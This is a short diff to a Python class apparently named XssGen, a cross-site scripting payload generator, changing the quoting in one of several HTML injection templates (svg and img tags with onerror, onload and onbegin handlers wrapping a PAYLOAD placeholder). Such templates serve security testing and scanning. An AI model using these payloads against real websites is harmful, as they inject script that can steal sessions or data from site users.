@@ -31,7 +31,7 @@ class XssGen():
             '<svg><script>PAYLOAD</script></svg>',
             '<img/src="x"/onerror="PAYLOAD">',
             '<img src=x onerror="PAYLOAD">',
-            '<svg/onload="PAYLOAD"//>',
+            '<svg/onload=\'PAYLOAD\'//>',
             '<svg><animate onbegin="PAYLOAD">',
         ]
 
